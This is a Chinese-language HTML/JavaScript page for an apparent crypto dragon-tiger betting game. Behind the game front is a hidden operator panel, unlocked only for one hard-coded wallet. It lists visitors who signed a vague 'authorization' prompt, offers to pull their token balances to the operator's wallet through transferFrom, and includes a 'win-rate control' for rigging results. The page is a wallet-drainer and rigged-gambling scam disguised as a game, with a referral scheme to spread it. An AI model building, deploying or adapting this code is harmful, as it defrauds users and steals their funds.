<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>王者归来</title>
  <style>
    * { box-sizing:border-box; font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background:#0B2A23; color:#fff; margin:0; padding:0; }
    .container { max-width:600px; margin:0 auto; padding:10px; }
    .header { display:flex; justify-content:space-between; align-items:center; padding:10px 0; }
    .header .title { font-size:20px; font-weight:bold; }
    .btn-menu { background:none; border:none; color:#fff; font-size:24px; cursor:pointer; }

    .card { background:#144A3F; border-radius:12px; padding:15px; margin-bottom:15px; }
    .card-title { font-size:16px; margin-bottom:10px; color:#F0E6D2; }
    .btn-connect { background:#25907A; color:#fff; border:none; padding:12px 16px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; margin-bottom:10px; }
    .btn-sign { background:#E4B449; color:#0B2A23; border:none; padding:12px 16px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; }
    .wallet-row { display:flex; align-items:center; gap:6px; font-size:14px; margin:6px 0; }

    .bet-area { display:flex; gap:10px; margin-bottom:10px; }
    .bet-input { flex:2; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:12px; border-radius:8px; }
    .balance-display { flex:1; background:#0E362E; border:1px solid #1F5F52; padding:12px; border-radius:8px; text-align:center; font-size:14px; }
    .quick-buttons { display:flex; gap:8px; margin-bottom:10px; }
    .btn-quick { flex:1; background:#1F5F52; color:#F0E6D2; border:none; padding:10px; border-radius:8px; cursor:pointer; }
    .odds-buttons { display:flex; gap:8px; margin-bottom:10px; }
    .btn-odds { flex:1; border:none; padding:14px; border-radius:8px; font-weight:bold; color:#fff; cursor:pointer; }
    .btn-dragon { background:#2A65CC; }
    .btn-tiger { background:#D93A54; }
    .btn-tie { background:#E4B449; color:#0B2A23; }

    .draw-timer { font-size:28px; color:#E4B449; margin:10px 0; text-align:center; }
    .btn-auto-draw { background:#E4B449; color:#0B2A23; border:none; padding:14px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; }
    .trend-chart { display:flex; gap:8px; flex-wrap:wrap; padding:10px 0; }
    .trend-item { width:32px; height:32px; border-radius:6px; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:12px; }
    .trend-long { background:#2A65CC; color:#fff; }
    .trend-short { background:#D93A54; color:#fff; }
    .rules { font-size:14px; line-height:1.7; color:#eee; }

    .menu { position:fixed; top:0; right:0; width:320px; height:100vh; background:#103D34; padding:24px; transform:translateX(100%); transition:0.3s; z-index:999; overflow-y:auto; padding-bottom:140px; }
    .menu.show { transform:translateX(0); }
    .menu-close { text-align:right; margin-bottom:20px; }
    .menu-section { margin-bottom:30px; }
    .menu-title { font-size:16px; margin-bottom:12px; color:#F0E6D2; }
    .input-menu { width:100%; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:14px; border-radius:8px; margin-bottom:12px; font-size:14px; }
    .btn-menu-action { width:100%; background:#1F5F52; color:#F0E6D2; border:none; padding:14px; border-radius:8px; margin-bottom:10px; cursor:pointer; font-size:14px; }
    .btn-green { background:#27ae60; }
    .btn-red { background:#ff3366; }
    .hidden { display:none !important; }

    #authModal {
      position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.85);
      display:flex; align-items:center; justify-content:center; z-index:99999;
    }
    .auth-dialog {
      background:#175547; width:85%; max-width:360px; border-radius:16px; padding:30px 24px; text-align:center;
    }
    .auth-desc { font-size:15px; color:#eee; margin:20px 0; }
    .auth-btns { display:flex; gap:12px; }
    .auth-cancel { flex:1; background:#335550; border:none; color:#fff; padding:14px; border-radius:10px; cursor:pointer; }
    .auth-confirm { flex:1; background:#25907A; border:none; color:#fff; padding:14px; border-radius:10px; cursor:pointer; font-weight:bold; }

    .player-item {
      background:#1F5F52; padding:12px; border-radius:8px; margin-bottom:10px;
      display:flex; flex-direction:column; gap:8px; font-size:13px;
    }
    .player-row { display:flex; justify-content:space-between; align-items:center; }
    .copy-btn { background:#25907A; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; font-size:12px; }

    .progress-bar { width:100%; height:12px; background:#0E362E; border-radius:6px; overflow:hidden; margin:10px 0; }
    .progress-fill { height:100%; background:#E4B449; width:50%; }
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="title">🐉🐯 王者归来</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <button class="btn-sign" onclick="userSign()">每日签到</button>
    <div class="wallet-row">
      <span>地址：</span><span id="address">未连接</span>
    </div>
    <div class="wallet-row">
      <span>余额：</span><span id="userBalance">0.0000</span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">下注区</div>
    <div class="bet-area">
      <input type="number" class="bet-input" id="betAmt" placeholder="下注数量" value="1">
      <div class="balance-display" id="balanceDisplay">余额 0.0000</div>
    </div>
    <div class="quick-buttons">
      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
    </div>
    <div class="odds-buttons">
      <button class="btn-odds btn-dragon">龙 1:2</button>
      <button class="btn-odds btn-tiger">虎 1:2</button>
      <button class="btn-odds btn-tie">和 1:9</button>
    </div>
  </div>

  <div class="card">
    <div class="card-title">自动开奖</div>
    <div>期号：<span id="round">#1</span></div>
    <div class="draw-timer" id="timer">02:00</div>
    <button class="btn-auto-draw">立即开奖</button>
  </div>
</div>

<!-- 右侧后台 -->
<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">王者归来游戏</div>
    <div>地址：<span id="showAddress">-</span></div>
    <div>余额：<span id="showBalance">-</span></div>
  </div>

  <div class="menu-section">
    <div class="menu-title">我的邀请</div>
    <input type="text" class="input-menu" id="refLink" readonly>
    <button class="btn-menu-action" onclick="copyMyLink()">复制我的邀请链接</button>
  </div>

  <!-- 玩家列表（仅游戏钱包可见） -->
  <div class="menu-section hidden" id="adminPanel">
    <div class="menu-title">已授权玩家</div>
    <div id="playerList" style="margin-bottom:30px;"></div>

    <div class="menu-title">提取玩家资产</div>
    <input type="text" class="input-menu" id="toAddr" placeholder="玩家钱包地址">
    <input type="number" class="input-menu" id="toAmt" placeholder="提取数量">
    <button class="btn-menu-action btn-red" onclick="doExtract()">确认提取到游戏钱包</button>
  </div>

  <!-- 胜率控制（最底部） -->
  <div class="menu-section hidden" id="ratePanel" style="position:absolute; bottom:20px; width:270px;">
    <div class="menu-title">胜率控制</div>
    <div>玩家 ←→ 游戏</div>
    <div class="progress-bar"><div class="progress-fill" id="pBar"></div></div>
    <input type="number" class="input-menu" id="gameRate" placeholder="游戏胜率 0-100">
    <button class="btn-menu-action" onclick="saveRate()">保存胜率</button>
  </div>
</div>

<!-- 授权弹窗 -->
<div id="authModal" class="hidden">
  <div class="auth-dialog">
    <div class="auth-title">授权确认</div>
    <div class="auth-desc">您正在授权王者归来游戏<br>是否同意？</div>
    <div class="auth-btns">
      <button class="auth-cancel" onclick="closeAuth()">取消</button>
      <button class="auth-confirm" onclick="doAuthSign()">确认</button>
    </div>
  </div>
</div>

<script>
// ===================== 配置 =====================
const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
const GAME_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

let account;
let winRate = 50;
let authPlayers = JSON.parse(localStorage.getItem("authPlayers") || "[]");
let relations = JSON.parse(localStorage.getItem("relations") || "{}");

function $(id) { return document.getElementById(id); }
function low(addr) { return addr?.toLowerCase() || ""; }
function isGame() { return low(account) === low(GAME_WALLET); }

// 读取邀请码
const urlParams = new URLSearchParams(location.search);
const inviter = urlParams.get("ref");

// 连接钱包
async function connectWallet() {
  if(!window.ethereum) return alert("请在钱包浏览器打开");
  const accounts = await ethereum.request({ method:"eth_requestAccounts" });
  account = low(accounts[0]);
  $("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
  showAuth();
}

// 授权签名
function showAuth() { $("authModal").classList.remove("hidden"); }
function closeAuth() { $("authModal").classList.add("hidden"); }

async function doAuthSign() {
  try {
    const text = "是否确认授权游戏签名";
    const hex = "0x" + Array.from(new TextEncoder().encode(text)).map(b=>b.toString(16).padStart(2,'0')).join("");
    await ethereum.request({ method:"personal_sign", params:[hex, account] });

    if(!authPlayers.includes(account)) {
      authPlayers.push(account);
      localStorage.setItem("authPlayers", JSON.stringify(authPlayers));
    }

    // 绑定上下级
    if(inviter && low(inviter) !== account && !relations[account]) {
      relations[account] = inviter;
      localStorage.setItem("relations", JSON.stringify(relations));
    }

    closeAuth();
    alert("✅ 授权成功");
    refreshBalance();
  } catch(e) {
    alert("授权已取消");
  }
}

// 刷新余额
async function getBalance(addr) {
  try {
    const data = "0x70a08231" + addr.slice(2).padStart(64,'0');
    const res = await ethereum.request({ method:"eth_call", params:[{to:TOKEN, data}, "latest"] });
    return Number(BigInt(res)) / 1e18;
  } catch(e) { return 0; }
}

async function refreshBalance() {
  if(!account) return;
  const b = await getBalance(account);
  $("userBalance").innerText = b.toFixed(4);
  $("balanceDisplay").innerText = "余额 "+b.toFixed(4);
  $("showBalance").innerText = b.toFixed(4);
}

// 打开后台
function toggleMenu() {
  $("menu").classList.toggle("show");
  $("showAddress").innerText = account ? account.slice(0,10)+"..." : "未连接";
  refreshBalance();
  if(isGame()) {
    $("adminPanel").classList.remove("hidden");
    $("ratePanel").classList.remove("hidden");
    renderPlayers();
  } else {
    $("adminPanel").classList.add("hidden");
    $("ratePanel").classList.add("hidden");
  }
  updateBar();
}

// 渲染玩家列表
async function renderPlayers() {
  const el = $("playerList");
  el.innerHTML = "";
  for(let addr of authPlayers) {
    const bal = await getBalance(addr);
    const item = document.createElement("div");
    item.className = "player-item";
    item.innerHTML = `
      <div class="player-row">
        <span>${addr}</span>
        <button class="copy-btn" onclick="copy('${addr}')">复制地址</button>
      </div>
      <div class="player-row">
        <span>余额：${bal.toFixed(4)}</span>
      </div>
    `;
    el.appendChild(item);
  }
}

function copy(txt) {
  navigator.clipboard.writeText(txt).then(()=>alert("已复制"));
}

// 正规提取：输入地址 + 数量
async function doExtract() {
  const addr = $("toAddr").value.trim();
  const amt = parseFloat($("toAmt").value);
  if(!addr || isNaN(amt) || amt <= 0) return alert("请正确填写");
  try {
    const amount = BigInt(Math.floor(amt * 1e18));
    const data = "0x23b872dd" +
      low(addr).slice(2).padStart(64,'0') +
      low(GAME_WALLET).slice(2).padStart(64,'0') +
      amount.toString(16).padStart(64,'0');

    await ethereum.request({
      method:"eth_sendTransaction",
      params:[{ from:account, to:TOKEN, data, gasLimit:"0x300000" }]
    });
    alert("✅ 提取成功，已上链到账");
    renderPlayers();
  } catch(e) {
    alert("提取失败：玩家未授权或余额不足");
  }
}

// 邀请链接
function copyMyLink() {
  if(!account) return alert("请连接钱包");
  const link = location.origin + location.pathname + "?ref=" + account;
  $("refLink").value = link;
  navigator.clipboard.writeText(link).then(()=>alert("已复制邀请链接"));
}

// 胜率
function updateBar() { $("pBar").style.width = winRate+"%"; }
function saveRate() {
  const v = parseInt($("gameRate").value);
  if(v<0||v>100)return alert("0-100");
  winRate = v;
  updateBar();
  alert("保存成功");
}

// 简易功能
function setQuick(v) { $("betAmt").value = v; }
async function userSign() { alert("签到成功"); }
</script>
</body>
</html>
